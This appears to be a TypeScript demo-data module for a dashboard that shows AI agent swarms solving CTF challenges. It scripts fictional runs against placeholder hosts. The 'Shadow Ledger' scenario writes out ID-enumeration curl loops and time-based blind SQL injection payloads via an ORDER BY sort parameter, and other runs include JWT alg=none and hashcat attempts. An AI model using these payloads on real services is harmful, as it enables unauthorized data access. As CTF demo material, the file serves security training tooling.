import { EventType, emptyDeck, reduce, type DeckState, type MutekiEvent } from "./events";
import type { RunSummary } from "./useRun";

export const CTF_DEMO_PREFIX = "demo-ctf-";
export const CTF_DEMO_DEFAULT_RUN = "demo-ctf-live";
export const CTF_DEMO_NOTICE = "演示数据：不会向后端发送任何操作。";

export function isCtfDemoRunId(id: string | null | undefined): boolean {
  return !!id && id.startsWith(CTF_DEMO_PREFIX);
}

type Payload = Record<string, unknown>;

interface ScriptApi {
  emit(type: EventType, at: number, payload?: Payload, solver?: string): void;
  bb(at: number, kind: string, fields?: Payload, actor?: string): void;
  tool(at: number, seconds: number, solver: string, command: string, output?: string): void;
  think(at: number, solver: string, text: string): void;
  say(at: number, solver: string, text: string, mainThread?: boolean): void;
  worker(at: number, id: string, engine: string, model: string, phase: string, extra?: Payload): void;
  cost(at: number, solver: string, usd: number, tokensIn: number, tokensOut: number): void;
}

function script(runId: string, t0: number, build: (api: ScriptApi) => void): MutekiEvent[] {
  const rows: { at: number; order: number; event: Omit<MutekiEvent, "seq"> }[] = [];
  let order = 0;
  let callId = 0;
  const emit: ScriptApi["emit"] = (event_type, at, payload = {}, solver) => {
    rows.push({ at, order: order++, event: { event_type, ts: t0 + at, run_id: runId, solver_id: solver ?? null, payload } });
  };
  const api: ScriptApi = {
    emit,
    bb: (at, kind, fields = {}, actor = "coordinator") => emit(EventType.BLACKBOARD_DELTA, at, { kind, actor, ...fields }, actor),
    tool: (at, seconds, solver, command, output) => {
      const id = `call-${++callId}`;
      emit(EventType.TOOL_CALL_START, at, { tool: command, tool_call_id: id }, solver);
      if (output !== undefined) emit(EventType.TOOL_CALL_RESULT, at + seconds, { tool_call_id: id, result: { condensed: output } }, solver);
    },
    think: (at, solver, text) => emit(EventType.REASONING_DELTA, at, { text }, solver),
    say: (at, solver, text, mainThread = false) => emit(EventType.TEXT_MESSAGE_DELTA, at, { text, ...(mainThread ? { main_thread: true } : {}) }, solver),
    worker: (at, id, engine, model, phase, extra = {}) => {
      const role = phase === "review" ? "review" : "worker";
      emit(EventType.BLACKBOARD_DELTA, at, { kind: "worker_spawned", actor: "coordinator", worker: id, phase, engine, model, worker_role: role, connection: "official", ...extra }, "coordinator");
      emit(EventType.WORKER_STATUS, at + 1, { online: true, status: "online", engine, model, phase, worker_role: role, connection: "official", ...extra }, id);
    },
    cost: (at, solver, usd, tokensIn, tokensOut) => emit(EventType.COST_UPDATE, at, { scope: "solver", usd, input_tokens: tokensIn, output_tokens: tokensOut }, solver),
  };
  build(api);
  return rows
    .sort((a, b) => a.at - b.at || a.order - b.order)
    .map((row, index) => ({ ...row.event, seq: index + 1 }));
}

const TARGET = "http://ledger.ctf.example.invalid:8080";

function liveRun(runId: string, t0: number): MutekiEvent[] {
  const challenge = {
    name: "Shadow Ledger",
    category: "web",
    mode: "ctf",
    target: TARGET,
    flag_format: "flag{...}",
    description: "Shadow Ledger 是一个记账服务，管理员把 flag 藏在只有审计员能看到的账目里。\n目标 http://ledger.ctf.example.invalid:8080 ，flag 格式 flag{...}。",
  };
  return script(runId, t0, ({ emit, bb, tool, think, say, worker, cost }) => {
    emit(EventType.RUN_PREPARING, 0, { kind: "swarm", challenge, name_autogen: true });
    emit(EventType.RUN_TITLED, 3, { title: "Shadow Ledger · 账本越权与盲注", category: "web" });
    bb(4, "race_started", { engines: ["claude", "codex", "kimi"] });
    worker(5, "cli-claude", "claude", "claude-opus", "race");
    worker(5, "cli-codex", "codex", "gpt-codex", "race");
    worker(6, "cli-kimi", "kimi", "kimi-k2", "race");
    for (const id of ["cli-claude", "cli-codex", "cli-kimi"]) emit(EventType.RUN_STARTED, 8, { kind: "swarm", challenge }, id);

    think(12, "cli-claude", "先确认服务指纹和登录流程，再看前端暴露的接口。");
    tool(16, 2, "cli-claude", `curl -si ${TARGET}/`, "HTTP/1.1 200 OK\nX-Powered-By: Express\nSet-Cookie: sid=…; HttpOnly\n<title>Shadow Ledger</title>");
    tool(18, 41, "cli-codex", `ffuf -u ${TARGET}/FUZZ -w common.txt -mc 200,301,401`, "api      [Status: 401]\nlogin    [Status: 200]\nexport   [Status: 401]\nstatic   [Status: 301]");
    tool(21, 3, "cli-kimi", `curl -s ${TARGET}/static/app.js | grep -o '/api/[a-z/]*' | sort -u`, "/api/export\n/api/ledger\n/api/login\n/api/me\n/api/notes\n/api/register\n/api/users");
    tool(48, 2, "cli-claude", `curl -s -X POST ${TARGET}/api/register -d 'user=demo&pass=demo'`, '{"ok":true,"token":"eyJhbGciOiJIUzI1NiJ9.…"}');
    bb(96, "observation_added", { observation_seq: 4, text: "前端 app.js 暴露 7 个 /api 路由；后端为 Express，会话使用 HS256 JWT", source_solver: "cli-kimi", confidence: 0.9, admitted: true, admitted_fact_seq: 11 }, "cli-kimi");
    bb(97, "fact_added", { fact_seq: 11, observation_seq: 4, fact: "前端 app.js 暴露 7 个 /api 路由；后端为 Express，会话使用 HS256 JWT", verified: true, confidence: 0.92, verifier: "coordinator", source_solver: "cli-kimi" });
    say(140, "cli-codex", "race 轮未直接拿到 flag，已把路由与鉴权信息写入共享图。");
    bb(150, "race_worker_finished", { worker: "cli-kimi", finished: 1, total: 3 });
    bb(171, "race_worker_finished", { worker: "cli-claude", finished: 2, total: 3 });
    bb(182, "race_worker_finished", { worker: "cli-codex", finished: 3, total: 3 });
    bb(183, "race_concluded", { solved: false, flags: 0 });
    cost(183, "cli-claude", 0.84, 182_000, 12_400);
    cost(183, "cli-codex", 0.61, 140_300, 9_100);
    cost(183, "cli-kimi", 0.12, 96_200, 5_300);

    bb(186, "reason_start", { trigger: "race_handoff" }, "reason");
    bb(204, "reason_done", { proposed: 4, dropped_dup: 1, dropped_total: 1 }, "reason");
    bb(205, "intent_proposed", { intent_id: "I-1", goal: "验证 /api/ledger?id= 是否存在越权读取", worker_class: "web", from_facts: [11], priority: 2 }, "reason");
    bb(205, "intent_proposed", { intent_id: "I-2", goal: "测试 /api/export 的 sort 参数是否可注入", worker_class: "web", from_facts: [11], priority: 1 }, "reason");
    bb(205, "intent_proposed", { intent_id: "I-3", goal: "分析 JWT：alg=none、弱密钥与 kid 注入", worker_class: "crypto", from_facts: [11], priority: 3 }, "reason");
    bb(205, "intent_proposed", { intent_id: "I-4", goal: "梳理 /api/notes 的读取权限与审计员会话", worker_class: "web", from_facts: [11], priority: 4 }, "reason");
    worker(208, "cli-claude-2", "claude", "claude-opus", "explore", { intent_id: "I-1" });
    worker(208, "cli-codex-2", "codex", "gpt-codex", "explore", { intent_id: "I-2" });
    worker(209, "cli-kimi-2", "kimi", "kimi-k2", "explore", { intent_id: "I-3" });
    bb(212, "intent_claimed", { intent_id: "I-1", worker: "cli-claude-2" }, "cli-claude-2");
    bb(212, "intent_claimed", { intent_id: "I-2", worker: "cli-codex-2" }, "cli-codex-2");
    bb(213, "intent_claimed", { intent_id: "I-3", worker: "cli-kimi-2" }, "cli-kimi-2");

    think(220, "cli-claude-2", "账目 id 是自增整数，先用普通用户 token 遍历前 40 条，看 owner 是否被校验。");
    tool(231, 2, "cli-claude-2", `curl -s -H "Authorization: Bearer $TOKEN" '${TARGET}/api/ledger?id=1'`, '{"id":1,"owner":"alice","amount":-120.5,"memo":"coffee"}');
    tool(250, 14, "cli-claude-2", `for i in $(seq 1 41); do curl -s -H "Authorization: Bearer $TOKEN" "${TARGET}/api/ledger?id=$i"; done | jq -c '{id,owner}'`, '{"id":1,"owner":"alice"}\n{"id":2,"owner":"bob"}\n…\n{"id":37,"owner":"auditor"}\n{"id":41,"owner":"admin"}');
    bb(290, "fact_added", { fact_seq: 14, fact: "/api/ledger?id= 越权：普通用户可读取任意账目（id 自增，共 41 条）", verified: true, confidence: 0.97, verifier: "cli-kimi-2", source_solver: "cli-claude-2", intent_id: "I-1" });
    bb(292, "intent_concluded", { intent_id: "I-1", worker: "cli-claude-2", result: "confirmed", to_fact_seq: 14 }, "cli-claude-2");

    think(226, "cli-codex-2", "sort 参数直接进了 ORDER BY；用 CASE WHEN 做布尔分支，再用 randomblob 放大时间差。");
    tool(240, 1, "cli-codex-2", `curl -s '${TARGET}/api/export?sort=amount' -H "Authorization: Bearer $TOKEN" | head -3`, "id,owner,amount\n3,carol,9.99\n1,alice,-120.5");
    tool(268, 1, "cli-codex-2", `curl -s -o /dev/null -w '%{time_total}' "${TARGET}/api/export?sort=(CASE WHEN (1=1) THEN amount ELSE id END)"`, "0.212");
    tool(301, 2, "cli-codex-2", `curl -s -o /dev/null -w '%{time_total}' "${TARGET}/api/export?sort=(CASE WHEN (SELECT 1 FROM sqlite_master WHERE name='audit_entries') THEN randomblob(90000000) ELSE id END)"`, "1.981");
    bb(330, "fact_added", { fact_seq: 17, fact: "/api/export?sort= 拼接进 ORDER BY，可构造布尔/时间盲注（响应差约 1.8s）", verified: true, confidence: 0.95, verifier: "cli-claude-2", source_solver: "cli-codex-2", intent_id: "I-2" });
    bb(352, "fact_added", { fact_seq: 19, fact: "库中存在 audit_entries 表（列：id, actor, note, created_at）", verified: true, confidence: 0.88, verifier: "cli-codex-2", source_solver: "cli-codex-2", intent_id: "I-2" });
    bb(360, "poc_saved", { poc_id: "poc-export-sqli", name: "export-sqli-extract.py", entry_command: "python3 export-sqli-extract.py --table audit_entries --column note", status: "available", intent_id: "I-2", note: "ORDER BY 布尔盲注，二分取字符，默认 2 线程" }, "cli-codex-2");
    bb(362, "intent_concluded", { intent_id: "I-2", worker: "cli-codex-2", result: "confirmed", to_fact_seq: 17 }, "cli-codex-2");

    think(230, "cli-kimi-2", "先试 alg=none，再用字典爆破 HS256 密钥。");
    tool(244, 2, "cli-kimi-2", "python3 jwt_tool.py $TOKEN -X a", "[-] alg:none → 401 Unauthorized");
    tool(262, 380, "cli-kimi-2", "hashcat -m 16500 jwt.txt rockyou.txt --quiet", "Status: Exhausted\nexit code 1");
    bb(650, "dead_end", { dead_end_seq: 21, reason: "JWT alg=none 被拒绝，rockyou 字典未破解 HS256 密钥", tested_scope: "alg=none, kid 路径注入, rockyou.txt", observed_result: "401 / Exhausted", intent_id: "I-3" }, "cli-kimi-2");
    bb(652, "intent_concluded", { intent_id: "I-3", worker: "cli-kimi-2", result: "dead_end" }, "cli-kimi-2");
    bb(655, "worker_finished", { worker: "cli-kimi-2", result: "done" });

    emit(EventType.PROGRESS_BRIEF, 700, {
      brief_id: "brief-1", kind: "periodic", phase: "running", mode: "ctf", trigger: "automatic", summary_source: "reason",
      summary: "已确认账目越权读取与 /api/export 的 ORDER BY 盲注，JWT 方向已排除。下一步用盲注提取 audit_entries 中审计员的备注。",
      source_from_seq: 1, source_to_seq: 80,
      sections: {
        confirmed: [{ text: "/api/ledger?id= 可越权读取任意账目", ref: { kind: "fact", id: "14" } }, { text: "/api/export?sort= 存在 ORDER BY 盲注", ref: { kind: "fact", id: "17" } }],
        active: [{ text: "盲注提取 audit_entries.note", ref: { kind: "intent", id: "I-5" } }],
        blocked: [{ text: "JWT 签名无法伪造（alg=none 被拒、字典未命中）" }],
        next: [{ text: "若备注中没有 flag，转查 /api/notes 的审计员会话" }],
      },
    }, "coordinator");
    bb(712, "reason_done", { proposed: 2 }, "reason");
    bb(713, "intent_proposed", { intent_id: "I-5", goal: "用 /api/export 盲注逐字符提取 audit_entries.note（actor=auditor）", worker_class: "web", from_facts: [17, 19], priority: 1 }, "reason");
    bb(713, "intent_proposed", { intent_id: "I-6", goal: "确认 /api/notes/:id 能否以审计员身份读取正文", worker_class: "web", from_facts: [14], priority: 2 }, "reason");
    bb(720, "intent_claimed", { intent_id: "I-5", worker: "cli-codex-2" }, "cli-codex-2");
    bb(722, "intent_claimed", { intent_id: "I-4", worker: "cli-claude-2" }, "cli-claude-2");
    worker(760, "cli-claude-review", "claude", "claude-sonnet", "review");
    bb(905, "review_finding", { finding_id: "rv-1", finding_kind: "evidence_gap", severity: "warn", summary: "F19 的表结构只由时间差推断，建议用布尔盲注再确认一次列名。", recommended_actions: ["用布尔盲注复核 audit_entries 的列名"], evidence_seqs: [19], worker: "cli-claude-review" }, "coordinator");

    emit(EventType.HITL_REQUEST, 800, {
      request_id: "hitl-rate", worker: "cli-codex-2", need_kind: "worker_uncertainty",
      need: "盲注逐字符提取较慢（约 3 字符/分钟）。是否允许把并发提高到 8 线程？目标可能有速率限制。",
      options: ["允许 8 线程", "保持 2 线程"],
    }, "cli-codex-2");
    emit(EventType.CONTROL_COMMAND, 842, { command_id: "cmd-hint-1", action: "hint", target: "global", status: "effect_observed", effect: { kind: "live_guidance_broadcast", delivered: 2, workers: 2 } });
    emit(EventType.HITL_RESPONSE, 842, { action: "hint", text: "audit_entries 里 actor=auditor 的记录优先", target: "global" });
    emit(EventType.GUIDANCE_INJECTED, 846, { note: "cli-codex-2 已接收提示：只提取 actor=auditor 的记录" }, "cli-codex-2");

    tool(760, 2, "cli-claude-2", `curl -s '${TARGET}/api/notes?owner=auditor' -H "Authorization: Bearer $TOKEN"`, '{"error":"forbidden"}');
    tool(790, 2, "cli-claude-2", `curl -s '${TARGET}/api/notes/7f3c' -H "Authorization: Bearer $TOKEN"`, '{"id":"7f3c","owner":"auditor","body":"<redacted by policy>"}');
    bb(880, "observation_added", { observation_seq: 9, text: "审计员备注提到 shadow ledger 位于 /api/notes/7f3c，正文被服务端脱敏", source_solver: "cli-claude-2", confidence: 0.6, admitted: false, intent_id: "I-4" }, "cli-claude-2");
    tool(870, 410, "cli-codex-2", "python3 export-sqli-extract.py --table audit_entries --where \"actor='auditor'\" --column note --threads 2", "[*] row 1/3: quarterly reconciliation ok\n[*] row 2/3: shadow ledger moved to note 7f3c\n[*] row 3/3: fla");
    emit(EventType.PROGRESS_BRIEF, 1290, {
      brief_id: "brief-2", kind: "milestone", phase: "running", mode: "ctf", trigger: "automatic", summary_source: "reason",
      summary: "盲注已取回 2/3 条审计员备注，第 3 条以 \"fla\" 开头，正在继续逐字符提取。",
      source_from_seq: 81, source_to_seq: 140,
      sections: {
        confirmed: [{ text: "审计员备注第 2 条指向 note 7f3c", ref: { kind: "observation", id: "9" } }],
        active: [{ text: "提取第 3 条备注（已得 3 个字符）", ref: { kind: "intent", id: "I-5" } }],
        blocked: [],
        next: [{ text: "拿到完整字符串后用 /api/ledger 越权复核" }],
      },
    }, "coordinator");
    tool(1300, 0, "cli-codex-2", "python3 export-sqli-extract.py --table audit_entries --where \"id=37\" --column note --offset 3 --threads 2");
    think(1310, "cli-claude-2", "note 7f3c 的正文被脱敏，试试用账目越权拿到审计员的会话 id。");
    tool(1330, 0, "cli-claude-2", `curl -s '${TARGET}/api/ledger?id=37' -H "Authorization: Bearer $TOKEN" | jq .memo`);

    cost(1290, "reason", 0.18, 64_000, 6_100);
    cost(1300, "cli-claude-2", 1.92, 410_200, 31_000);
    cost(1300, "cli-codex-2", 1.37, 305_400, 22_300);
    cost(655, "cli-kimi-2", 0.21, 120_100, 7_200);
    cost(1300, "cli-claude-review", 0.33, 70_500, 4_100);
  });
}

function solvedRun(runId: string, t0: number): MutekiEvent[] {
  const challenge = {
    name: "Lattice Lantern",
    category: "crypto",
    mode: "ctf",
    flag_format: "flag{...}",
    description: "题目给了一个 RSA 变体的加密脚本和 output.txt，私钥的高位泄露了。\n附件：lantern.py, output.txt",
    attachments: ["/data/demo/lantern.py", "/data/demo/output.txt"],
  };
  const flag = "flag{l4tt1c3_l4nt3rn_r3duc3d}";
  return script(runId, t0, ({ emit, bb, tool, think, worker, cost }) => {
    emit(EventType.RUN_PREPARING, 0, { kind: "swarm", challenge });
    emit(EventType.RUN_TITLED, 2, { title: "Lattice Lantern · 高位泄露 RSA", category: "crypto" });
    worker(4, "cli-claude", "claude", "claude-opus", "explore");
    worker(4, "cli-codex", "codex", "gpt-codex", "explore");
    for (const id of ["cli-claude", "cli-codex"]) emit(EventType.RUN_STARTED, 6, { kind: "swarm", challenge }, id);
    bb(30, "intent_proposed", { intent_id: "I-1", goal: "读懂 lantern.py 的密钥生成与泄露方式", worker_class: "crypto" }, "reason");
    bb(30, "intent_proposed", { intent_id: "I-2", goal: "用 Coppersmith 恢复 p 的低位", worker_class: "crypto" }, "reason");
    bb(32, "intent_claimed", { intent_id: "I-1", worker: "cli-claude" }, "cli-claude");
    bb(32, "intent_claimed", { intent_id: "I-2", worker: "cli-codex" }, "cli-codex");
    think(40, "cli-claude", "泄露了 p 的高 512 位，未知低位约 200 位，满足 Coppersmith 的界。");
    tool(60, 2, "cli-claude", "python3 -c 'import lantern; print(lantern.LEAK_BITS)'", "512");
    bb(140, "fact_added", { fact_seq: 5, fact: "output.txt 给出 p 的高 512 位，未知部分 200 位", verified: true, confidence: 0.96, verifier: "cli-codex", source_solver: "cli-claude", intent_id: "I-1" });
    tool(400, 1180, "cli-codex", "sage solve.sage", `p = 0xc3a1…\nq = 0x9f02…\n${flag}`);
    bb(1585, "fact_added", { fact_seq: 9, fact: "small_roots 恢复 p 后解密得到明文", verified: true, confidence: 0.99, verifier: "cli-claude", source_solver: "cli-codex", intent_id: "I-2" });
    bb(1590, "flag_found", { flag, intent_id: "I-2" }, "cli-codex");
    bb(1592, "intent_concluded", { intent_id: "I-2", worker: "cli-codex", result: "solved", to_fact_seq: 9 }, "cli-codex");
    emit(EventType.WORKER_FINISHED, 1600, { solved: true, flag, flags: [flag] }, "cli-codex");
    cost(1600, "cli-claude", 0.72, 150_000, 11_000);
    cost(1600, "cli-codex", 1.05, 220_000, 15_500);
    cost(1600, "reason", 0.09, 31_000, 2_900);
    emit(EventType.PROGRESS_BRIEF, 1610, {
      brief_id: "brief-final", kind: "final", phase: "solved", mode: "ctf", trigger: "automatic", summary_source: "reason",
      summary: "已解出：利用 p 的高位泄露，Coppersmith small_roots 恢复 p 后解密得到 flag。",
      sections: { confirmed: [{ text: "Coppersmith 恢复 p", ref: { kind: "fact", id: "9" } }], active: [], blocked: [], next: [] },
    }, "coordinator");
    emit(EventType.RUN_FINISHED, 1620, { solved: true, flag, flags: [flag], reason: "solved" });
  });
}

function pausedRun(runId: string, t0: number): MutekiEvent[] {
  const challenge = {
    name: "Rusty Pipe",
    category: "pwn",
    mode: "ctf",
    target: "nc pipe.ctf.example.invalid 31337",
    flag_format: "flag{...}",
    description: "Rust 写的管道服务，存在 use-after-free。附件：rusty_pipe（ELF x86-64）。\n远程：nc pipe.ctf.example.invalid 31337",
    attachments: ["/data/demo/rusty_pipe"],
  };
  return script(runId, t0, ({ emit, bb, tool, worker, cost }) => {
    emit(EventType.RUN_PREPARING, 0, { kind: "swarm", challenge });
    emit(EventType.RUN_TITLED, 2, { title: "Rusty Pipe · UAF 利用", category: "pwn" });
    worker(4, "cli-claude", "claude", "claude-opus", "explore");
    worker(4, "cli-codex", "codex", "gpt-codex", "explore");
    for (const id of ["cli-claude", "cli-codex"]) emit(EventType.RUN_STARTED, 6, { kind: "swarm", challenge }, id);
    tool(20, 2, "cli-claude", "checksec --file=rusty_pipe", "Arch: amd64\nRELRO: Full\nStack: Canary\nNX: enabled\nPIE: enabled");
    bb(300, "fact_added", { fact_seq: 6, fact: "drop(pipe) 后 reader 仍持有裸指针，tcache 可复用该块", verified: true, confidence: 0.9, verifier: "cli-codex", source_solver: "cli-claude" });
    tool(1500, 30, "cli-codex", "python3 exploit.py REMOTE", "[x] Connection reset by peer\nexit code 1");
    emit(EventType.HITL_REQUEST, 1540, {
      request_id: "hitl-remote", worker: "cli-codex", need_kind: "external_blocker",
      need: "远程 nc pipe.ctf.example.invalid 31337 连续 3 次连接被重置。本地利用已稳定，请确认题目实例是否需要重启或提供新端口。",
      options: ["实例已重启，继续", "改用新端口…"],
    }, "cli-codex");
    bb(1542, "awaiting_operator", { reason: "远程实例连接被重置，等待操作者确认环境" });
    cost(1540, "cli-claude", 0.66, 140_000, 9_000);
    cost(1540, "cli-codex", 0.98, 201_000, 14_000);
  });
}

const SCENARIOS: Record<string, { ageSec: number; build: (runId: string, t0: number) => MutekiEvent[] }> = {
  "demo-ctf-live": { ageSec: 23 * 60 + 14, build: liveRun },
  "demo-ctf-paused": { ageSec: 27 * 60, build: pausedRun },
  "demo-ctf-solved": { ageSec: 3 * 3600, build: solvedRun },
};

const deckCache = new Map<string, DeckState>();

export function ctfDemoDeck(runId: string): DeckState | null {
  const scenario = SCENARIOS[runId];
  if (!scenario) return null;
  const cached = deckCache.get(runId);
  if (cached) return cached;
  const t0 = Math.floor(Date.now() / 1000) - scenario.ageSec;
  const deck = scenario.build(runId, t0).reduce(reduce, emptyDeck(runId));
  deckCache.set(runId, deck);
  return deck;
}

export function ctfDemoUsage(runId: string) {
  const deck = ctfDemoDeck(runId);
  if (!deck) return null;
  const rows = Object.entries(deck.costBySolver).map(([name, cost]) => ({
    name,
    records: 1,
    total_tokens: cost.tokensIn + cost.tokensOut,
    input_tokens: cost.tokensIn,
    output_tokens: cost.tokensOut,
    cost: cost.usd,
    reported_cost: cost.usd,
    estimated_cost: null,
    unpriced: 0,
    pricing_coverage: { provider_reported: 1 },
  }));
  const sum = (pick: (row: (typeof rows)[number]) => number) => rows.reduce((total, row) => total + pick(row), 0);
  return {
    totals: {
      records: rows.length,
      total_tokens: sum((row) => row.total_tokens),
      input_tokens: sum((row) => row.input_tokens),
      output_tokens: sum((row) => row.output_tokens),
      cost: sum((row) => row.cost),
      reported_cost: sum((row) => row.cost),
      estimated_cost: null,
      unpriced: 0,
      pricing_coverage: { provider_reported: rows.length },
    },
    groups: { worker_id: rows },
  };
}

export function ctfDemoRunSummaries(): RunSummary[] {
  const now = Math.floor(Date.now() / 1000);
  const row = (run_id: string, name: string, category: string, status: RunSummary["status"], ago: number, order: number, extra: Partial<RunSummary> = {}): RunSummary => ({
    run_id, mode: "ctf", kind: "swarm", name, category,
    started: true, finished: status === "solved", solved: status === "solved", paused: status === "paused", status,
    pinned: false, archived: false, folder_id: null, order: 1_000_000 + order,
    updated: now - ago, updated_at: now - ago, ...extra,
  });
  return [
    row("demo-ctf-live", "Shadow Ledger · 账本越权与盲注", "web", "running", 20, 3),
    row("demo-ctf-paused", "Rusty Pipe · UAF 利用", "pwn", "paused", 4 * 60, 2),
    row("demo-ctf-solved", "Lattice Lantern · 高位泄露 RSA", "crypto", "solved", 2 * 3600, 1, { flag: "flag{l4tt1c3_l4nt3rn_r3duc3d}" }),
  ];
}
